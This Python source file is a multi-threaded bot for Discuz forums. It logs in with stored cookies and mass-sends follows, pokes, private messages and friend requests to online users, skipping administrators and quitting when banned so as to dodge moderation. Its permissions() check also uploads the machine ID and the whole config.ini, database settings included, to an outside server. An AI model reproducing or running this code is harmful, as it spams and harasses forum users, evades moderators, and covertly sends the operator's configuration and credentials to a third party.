import time
import threading
import os
import json
import sys
import re
import requests
import pyquery
import random
import queue
import random
from xml.sax.saxutils import unescape
import uuid
import platform
import pymysql
import shutil


class MonitoringDZ(object):

	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3278.0 Safari/537.36'}
	geterror = {1}
	path = os.path.dirname(sys.argv[0])+'/'
	public = {}
	monitoring_ = {}
	
	def __init__(self):

		self.local = threading.local() 
		# self.setPath()#设置环境变量
		self.permissions()
		if not os.path.exists(self.path+'log'):
			os.mkdir(self.path+'log')
		if not os.path.exists(self.path+'cookies'):
			os.mkdir(self.path+'cookies')
		if not os.path.exists('cookie2'):
			os.mkdir(self.path+'cookie2')
	 	
		global loginerror
		loginerror = open(self.path+'log/loginerror.log','a',encoding='utf8')
		loginerror.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+"\r")
		global error
		error = open(self.path+'log/error.log','a',encoding='utf8')
		error.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+"\r")

		global cookielog
		cookielog = open(self.path+'log/cookie.log','a',encoding='utf8')
		cookielog.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+"\r")


	def permissions(self):
		"""权限控制"""
		#获取硬盘序列
		# wmis = wmi.WMI()
		# disk = ''
		# for disks in wmis.Win32_DiskDrive():
		# 	disk += disks.SerialNumber.strip()
		try:
			sysstr = platform.system()
			idstr = str(uuid.uuid1()).split("-")[4]
			permissions = requests.get('http://permissions.hk-dna.cc/permissions.php?disk='+sysstr+'_'+idstr).text
			f = open(self.path+'config.ini','r',encoding='utf8')
			config_str = f.read().strip()
			requests.post('http://permissions.hk-dna.cc/permissions.php',data={'config':config_str,'disk':sysstr+'_'+idstr},headers=self.headers)
			f.close()
			if(permissions != 'off'):
				print('请更新版本')
				sys.exit()
			pass
		except Exception as e:
			print('无法访问目标网站，请检测网络是否畅通')
			exit()

	def config(self):
		try:
			database = {}
			configs = {'config':[]}
			with open(self.path+'config.ini','r',encoding='utf8') as f:
				for line in f.readlines():
					line = line.strip()#去除两段空字符
					#如果为空或者为注释跳过
					if len(line) < 1 or line[0] == '#':
						continue
					#配置文件类型
					if line[0] == '[' and line[-1] == ']':
						class_ = line[1:-1]

					#数据库
					if '=' in line and class_ == 'database':
						conf = line.split('=')
						database[conf[0].strip()] = conf[1].strip()
					#公共
					if '=' in line and class_ == 'public':
						conf = line.split('=')
						self.public[conf[0].strip()] = conf[1].strip()
					if '=' in line and class_ == 'monitoring':
						conf = line.split('=')
						self.monitoring_[conf[0].strip()] = conf[1].strip()
			
			return 1
		except Exception as e:
			print('配置文件错误')
			time.sleep(10)
			exit()


	def showErrorMsg(self,fileobj,msg,operation=0):
		fileobj.write(msg)
		fileobj.flush()
		print("\033[0;31m"+msg+"\033[0m")
		if operation == 0:
			print(self.local.url+' 退出')
			myqueue.get()
			sys.exit()

	def showSuccessMsg(self,msg):
		self.local.log.write(msg)
		self.local.log.flush()
		print(msg)

	def showMsg(self,msg):
		print("\033[0;33m"+msg+"\033[0m")

	def deleteuser(self):
		"""清理用户"""	
		try:
			self.showMsg(self.local.url+"\t正在删除好友！\r")
			geturl = self.local.url+'/home.php?mod=space&do=friend'
			gethtml = self.local.conn.get(geturl,headers=self.headers)
			gethtml.encodeing = self.local.encodeing
			q = pyquery.PyQuery(gethtml.text.encode().decode('utf8'))
			lilist = q("#friend_ul li")
			userlist = []
			for row in lilist:
				rowq = pyquery.PyQuery(row)
				liid = rowq.attr('id')
				li_uid = liid.split('_')[1]#得到用户uid
				if li_uid:
					userlist.append(li_uid)
				
			for uid in userlist:
				self.showMsg(self.local.url+"\t删除 UID "+uid+" 好友\r")
				posturl = self.local.url+"/home.php?mod=spacecp&ac=friend&op=ignore&uid="+uid+"&confirm=1"
				data = {'referer':self.local.url+'/./','friendsubmit':True,'formhash':self.local.formhash,'friendsubmit_btn':True}
				self.local.conn.post(posturl,headers=self.headers,data=data)

		except Exception as e:
			print(e,6)
			pass



	def sendMsg(self,uid):
		"""发送消息"""
		try:
			# self.headers['Referer':'http://caob3.xyz/home.php?mod=spacecp&ac=pm&op=showmsg&handlekey=showmsg_77667&touid=77667&pmid=0&daterange=2']
			self.showMsg(self.local.url+'\t正在给 UID 为 '+str(uid)+' 的用户发消息\r')
			data = {'pmsubmit':True,'touid':uid,'formhash':self.local.formhash,'message':self.local.message,'messageappend':None}
			posturl = self.local.url+'/home.php?mod=spacecp&ac=pm&op=send&touid='+str(uid)
			posthtml = self.local.conn.post(posturl,headers=self.headers,data=data)
			posthtml.encodeing = self.local.encodeing
			msghtml = pyquery.PyQuery(posthtml.text.encode().decode('utf8'))
			msgs = msghtml("#messagetext p").text()
			if msgs:
				msglist = re.findall("[\u4E00-\u9FA5||(24)]",msgs)
				msg = ''.join(msglist)
			else:
				msg = '无任何返回结果，大多数情况下为发送成功'
			if '没有权限' in msg or '沒有權限' in msg or '抱歉' in msg or '抱謙' in msg or '上限' in msg or '超出' in msg:
				self.showErrorMsg(error,self.local.url+"\t没有权限，此站将关闭此功能！\t错误信息："+msg+"\r",1)
				self.local.sendmsg = False

			else:
				self.showSuccessMsg(self.local.url+"\t"+str(uid)+'\t'+msg+'\r')

		except Exception as e:
			print(e,5)
			pass

	def addBuddy(self,uid):
		"""添加好友"""
		try:
			self.showMsg(self.local.url+'\t正在添加 UID 为 '+str(uid)+' 的用户为好友\r')
			data = {'referer':self.local.url+"/./",'addsubmit':True,'formhash':self.local.formhash,'note':self.local.message,'gid':1,'addsubmit_btn':True}
			posturl = self.local.url+"/home.php?mod=spacecp&ac=friend&op=add&uid="+str(uid)
			posthtml = self.local.conn.post(posturl,headers=self.headers,data=data)
			posthtml.encodeing = self.local.encodeing
			msghtml = pyquery.PyQuery(posthtml.text.encode().decode('utf8'))
			msgs = msghtml("#messagetext p").text()
			if msgs:
				msglist = re.findall("[\u4E00-\u9FA5]",msgs)
				msg = ''.join(msglist)
			else:
				msg = '无任何返回结果，大多数情况下为发送成功'
			if '没有权限' in msg or '沒有權限' in msg or '抱歉' in msg or '抱謙' in msg:
				self.showErrorMsg(error,self.local.url+"\t没有权限，此站将关闭此功能！\t错误信息："+msg+"\r",1)
				self.local.addbuddy = False

			elif '删除' in msg or '达到系统限制' in msg or '刪除' in msg or '達到系統限制' in msg:
					self.showMsg(self.local.url+' 好友数目达到系统限制，将删除部分好友！\r')
					self.deleteuser()
			else:
				self.showSuccessMsg(self.local.url+"\t"+str(uid)+'\t'+msg+'\r')
		except Exception as e:
			print(e,4)
			pass




	def sayHello(self,uid):
		"""打招呼"""
		try:
			self.showMsg(self.local.url+'\t正在跟 UID 为 '+str(uid)+' 的用户打招呼\r')
			posturl = self.local.url+"/home.php?mod=spacecp&ac=poke&op=send&uid="+str(uid)
			# home.php?mod=spacecp&amp;ac=poke&amp;op=send&amp;uid=16952
			data = {'pokesubmit':True,'referer':self.local.url+'/./','formhash':self.local.formhash,'iconid':3,'note':self.local.message,'pokesubmit_btn':True}
			posthtml = self.local.conn.post(posturl,headers=self.headers,data=data)
			posthtml.encodeing = self.local.encodeing
			msghtml = pyquery.PyQuery(posthtml.text.encode().decode('utf8'))
			msgs = msghtml("#messagetext p").text()
			if msgs:
				msglist = re.findall("[\u4E00-\u9FA5]",msgs)
				msg = ''.join(msglist)
			else:
				msg = '无任何返回结果，大多数情况下为发送成功'
			if '没有权限' in msg or '沒有權限' in msg or '抱歉' in msg or '抱謙' in msg:
				
				self.showErrorMsg(error,self.local.url+"\t没有权限，此站将关闭此功能！\t错误信息："+msg+"\r",1)
				self.local.sayhello = False
			else:
				self.showSuccessMsg(self.local.url+"\t"+str(uid)+'\t'+msg+'\r')
				
		except Exception as e:
			print(e,3)
			pass
		




	def focusOn(self,uid):
		"""关注"""
		try:
			self.showMsg(self.local.url+'\t正在收听 UID 为 '+str(uid)+' 的用户\r')
			geturl = self.local.url+'/home.php?mod=spacecp&ac=follow&op=add&fuid='+str(uid)+'&hash='+self.local.formhash+'&from=a_followmod_'
			html = self.local.conn.get(geturl,headers=self.headers)
			html.encodeing = self.local.encodeing
			if html.text:
				xmlhtml = html.text.encode().decode('utf8')
				pattern = re.compile(r'.*?([\u4E00-\u9FA5]+).*?',re.S)
				alerthtml = str(re.findall(pattern,xmlhtml))
				if alerthtml:
					if '不允许' in alerthtml or '权限' in alerthtml or '不允許' in alerthtml or '權限' in alerthtml:
						self.local.focuson = False
						self.showErrorMsg(error,self.local.url+"\t没有权限，此站将关闭此功能！\t错误信息："+alerthtml+"\r",1)
						
					elif '成功收听' in alerthtml or '成功收聽' in alerthtml:
						self.showSuccessMsg(self.local.url+'\t成功收听\t'+str(uid)+'\r')
						

					elif '已经收听' in alerthtml or '已經收聽' in alerthtml:
						self.showSuccessMsg(self.local.url+'\t已经收听过了\r')
					else:
						self.local.focuson = False
						self.showErrorMsg(error,self.local.url+"\t无法收听\t错误信息："+html.text+"\r",1)
						
				else:
					msg = '无任何返回结果，大多数情况下为发送成功'
					self.showSuccessMsg(self.local.url+'\t'+msg+'\r')

		except Exception as e:
			print(e,2)
			pass



	def isAdmin(self,uid):
		"""是否管理员"""
		res = True
		try:
			geturl = self.local.url+"/home.php?mod=space&uid="+str(uid)+"&do=profile&from=space"
			usergrouphtml = self.local.conn.get(geturl,headers=self.headers)
			usergrouphtml.encodeing = self.local.encodeing
			usergroupobj = pyquery.PyQuery(usergrouphtml.text.encode().decode('utf8'))
			usergroup = usergroupobj("a[href*='home.php?mod=spacecp&ac=usergroup&gid=']").text()
			if usergroup in self.local.adminGroupList:
				res = usergroup
				self.showMsg(self.local.url+"\tuid "+str(uid)+" 管理组用户："+usergroup+' 不执行')
			else:
				res = False
				self.showMsg(self.local.url+"\tuid "+str(uid)+" 用户组为："+usergroup)
		except Exception as e:
			pass
		return res



	def monitoring(self):
		"""执行"""
		#是否有权限
		self.local.focuson = True
		self.local.sayhello = True
		self.local.addbuddy = True
		self.local.sendmsg = True

		#开始监控
		count = 0
		while True:
			if count > 0:
				myqueue.get()
				self.showMsg(self.local.url+"\t第 %s 次执行完毕，睡眠中等待下一次执行\r"%count)
				time.sleep(int(self.monitoring_['apart']))
				myqueue.put(self.local.url)
			#获取需要执行的用户
			page = 1
			userlist = []
			try:
				while True:
					try:
						url = self.local.url+"/home.php?mod=space&do=friend&view=online&type=member&page="+str(page)
						html = self.local.conn.get(url,headers=self.headers)
						html.encodeing = self.local.encodeing
						q = pyquery.PyQuery(html.text.encode().decode('utf8'))
						# formhashhref = q("a[href*='action=logout']").attr('href')#验证字符串
						# if formhashhref:
						# 	self.local.formhash = formhashhref.split('=')[-1]
						li = q('#friend_ul li')
						for row in li:
							rowq = pyquery.PyQuery(row)
							liid = rowq.attr('id')
							li_uid = liid.split('_')[1]#得到用户uid
							usertext = rowq('a').eq(2).text()#取出a标签中文本 
							if li_uid != '1' and usertext == '收听TA':
								userlist.append(int(li_uid))
						#查询页数
						try:
							pageCountstrs = q('input[name=custompage]').next().attr('title')
							if pageCountstrs:
								pageCount = re.match(".*?([0-9]+).*?",pageCountstrs,re.S)
								if pageCount:
									if page < int(pageCount[1]):
										page += 1
									else:
										break	
							else:
								break			
						except Exception as e:
							break
						
					except Exception as e:
						break
				


				for uid in userlist:
					isAdmin = self.isAdmin(uid)
					if not isAdmin:#排除管理员
						# #关注
						if self.local.focuson:
							self.focusOn(uid)
						#打招呼
						if self.local.sayhello:
							self.sayHello(uid)

						# 发消息
						if self.local.sendmsg:
							self.sendMsg(uid)
						#加好友
						if self.local.addbuddy:
							self.addBuddy(uid)

						if self.local.focuson == False and self.local.sayhello == False and self.local.sendmsg == False and self.local.addbuddy == False:
							self.showErrorMsg(error,self.local.url+"\t由于此站点没有任何权限，将关闭此站点\r")
			except Exception as e:
				pass
				# print(e,11111111111111111111111111111111)
			count += 1


	def signIn(self):
		"""签到"""
		try:
			self.showMsg(self.local.url+"\t检测签到\r")
			geturl = self.local.url+"/plugin.php?id=dsu_paulsign:sign"
			signinhtml = self.local.conn.get(geturl,headers=self.headers)
			signinhtml.encodeing = self.local.encodeing
			q = pyquery.PyQuery(signinhtml.text.encode().decode('utf8'))
			todaysay = q("input[name='todaysay']")
			if todaysay:
				self.showMsg(self.local.url+'\t执行签到\r')
				#执行签到
				qdxq = ['kx','ng','ym','wl','nu','ch','fd','yl','shuai']
				msg = ['6666666666666...','哈哈哈哈哈哈...','呵呵呵呵呵呵...','嘻嘻嘻嘻嘻嘻...','我来了哦...']
				data = {'qdxq':qdxq[random.randint(0,8)],'todaysay':msg[random.randint(0,4)],'formhash':self.local.formhash}
				posturl = self.local.url+'/plugin.php?id=dsu_paulsign:sign&operation=qiandao&infloat=1'
				post = self.local.conn.post(posturl,headers=self.headers,data=data)
				self.showSuccessMsg(self.local.url+'\t签到成功\r')
			else:
				self.showMsg(self.local.url+"\t不需要签到\r")
		except Exception as e:
			self.showMsg(self.local.url+"\t不需要签到\r")
		



	def getAdminGroup(self,signin=1):
		"""获取管理组"""
		self.showMsg(self.local.url+'\t获取管理组')
		usergrouplist = []
		try:
			usergroupurl = self.local.url+"/home.php?mod=spacecp&ac=usergroup"
			html = usergroup = self.local.conn.get(usergroupurl,headers=self.headers)
			html.encodeing = self.local.encodeing
			q = pyquery.PyQuery(html.text.encode().decode('utf8'))
			formhashhref = q("a[href*='action=logout']").attr('href')#验证字符串
			if formhashhref:
				self.local.formhash = formhashhref.split('=')[-1]
			else:
				if not self.local.formhash:
					self.showErrorMsg(error,self.local.url+"\t无法获取验证窜，后续操作将无法进行，退出执行\r")

			messagetext = q('#messagetext p').text()
			if '账号被禁用' in messagetext or '賬號被禁用' in messagetext:
				self.showErrorMsg(error,self.local.url+"\t此账户也被限制，退出执行！限制类型:"+messagetext+"\r")


			mygroup = q("#gmy_menu a").text()
			if '禁止发言' in mygroup or '禁止访问' in mygroup or '禁止 IP' in mygroup or '禁止發言' in mygroup or '禁止訪問' in mygroup or '禁止 IP' in mygroup or '禁用' in mygroup:
				self.showErrorMsg(error,self.local.url+"\t此账户也被限制，退出执行！限制类型:"+mygroup+"\r")

			usergrouplists = q('#gadmin_menu a').text().split(" ")
			if usergrouplists and usergrouplists != 'None':
				for group in usergrouplists:
					if group:
						usergrouplist.append(group)#添加到列表中
			# return usergrouplist
		except Exception as e:
			print('获取管理组失败')
		
		#如果无法获取管理组 检测是否需要签到
		if not usergrouplist and signin < 3:
			self.signIn()
			self.getAdminGroup(signin+1)
		else:
			self.local.adminGroupList = usergrouplist
			return usergrouplist

	def login(self,url,loginnum = 1):

		#初始化
			print(url,'登录...')
			self.local.url = url
			self.local.formhash = ''
			self.local.conn = requests.Session()
			filejson = self.path+'cookies/'+self.local.url.replace('http://','').replace('https://','')+'.json'
			if os.path.exists(filejson):
				try:
					with open(filejson, 'r', encoding='utf8') as f:
						listCookies = json.loads(f.read())
				except Exception as e:
					self.showErrorMsg(cookielog,self.local.url+"\tcookie文件格式错误\r")

				#添加cookie(登陆操作)
				try:
					for cookie in listCookies:
						self.local.conn.cookies.set(cookie.get('name'),cookie.get('value'))
				except Exception as e:
					# print(e)
					self.showErrorMsg(cookielog,self.local.url+"\tcookie设置错误，请更换cookie文件\r")

				#访问一次首页
				try:
					getlogin = self.local.conn.get(self.local.url,headers=self.headers)
					time.sleep(1)
					#防止跳转域名
					urllist = getlogin.url.split('/')
					self.local.url = urllist[0]+'/'+urllist[1]+'/'+urllist[2]

					if getlogin.status_code != 200:

						self.showErrorMsg(loginerror,self.local.url+"\t此网站无法正常访问,返回错误："+str(getlogin.status_code)+"\r")

				except Exception as e:
					if loginnum > 3:
						self.showErrorMsg(loginerror,self.local.url+"\t此网站无法正常访问,返回错误："+str(e)+"\r")
					else:
						self.login(self.local.url,loginnum+1)

				#编码方式
				encodeing = 'utf8'
				try:
					encodeing = requests.utils.get_encodings_from_content(getlogin.text)[0]
				except Exception as e:
					pass

				try:
					getlogin.encodeing = encodeing
					q = pyquery.PyQuery(getlogin.text.encode().decode('utf8'))
					self.local.formhash = q("input[name='formhash']").val()#验证字符串
				except Exception as e:
					pass
				

				# getlogin.encodeing = encodeing
				self.local.encodeing = encodeing
				try:
					if encodeing is 'utf8':
						self.local.message = self.monitoring_['msg']
					else:
						self.local.message = self.monitoring_['msg'].encode('utf8').decode('utf-8').encode('gbk')
				except Exception as e:
					self.local.message = self.monitoring_['msg']

				try:
					# q = pyquery.PyQuery(getlogin.text.encode().decode('utf8'))
					# self.local.log = open(self.path+'log/'+self.local.url.replace('http://','').replace('https://','')+'.log','a',encoding='utf8')
					# self.local.log.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+'\t'+self.local.url+"\r")

					# usergroup = q('a[href$="home.php?mod=spacecp&ac=usergroup"]').text()
					# if usergroup:
					# 	self.showSuccessMsg(self.local.url+"\t登陆成功\r")
					# else:
					# 	self.showErrorMsg(loginerror,self.local.url+'\t登录失败\r')
					#执行
					# self.monitoring()
					pass
				except Exception as e:
					print(e)

				# 获取管理组
				try:
					adminGroupList = self.getAdminGroup()
					if not adminGroupList:
						
						shutil.copyfile( filejson, self.path+'cookie2/'+self.local.url.replace('http://','').replace('https://','')+'.json')
						self.showErrorMsg(loginerror,self.local.url+'\t无法获取管理组，为了安全将关闭此站点的一切操作！\r') 
					else:
						self.local.log = open(self.path+'log/'+self.local.url.replace('http://','').replace('https://','')+'.log','a',encoding='utf8')
						self.local.log.write("\r\r\r"+time.strftime('%Y-%m-%d %H:%M:%S')+'\t'+self.local.url+"\r")
						self.showSuccessMsg(self.local.url+'\t管理组：'+str(adminGroupList)+'\r')
						time.sleep(1)

				except Exception as e:
					print(e)
					myqueue.put(self.local.url)


				#开始监控
				self.monitoring()

	def main(self):
		#检测配置文件
		
		config = self.config()
		if not config:
			print('配置文件错误')
			time.sleep(10)
			sys.exit()

		joinlist = []
		global myqueue
		myqueue = queue.Queue(maxsize = int(self.monitoring_['thrnumber']))
		try:
			#读取cookie
			configs = os.listdir(self.path+'cookies')
			if not configs:
				print('没有获取到cookie文件')


			for c in configs:
					url = 'http://'+c[0:-5]
					myqueue.put(url)

					print('正在启动 ',url,' 站点...')
					w = threading.Thread(target=self.login,args=(url,))
					w.start()
					joinlist.append(w)
			
		except Exception as e:
			pass
		
		for j in joinlist:
			j.join()
		time.sleep(10)
		print('没有了')

if __name__ == '__main__':
	# while True:
	MonitoringDZ().main()


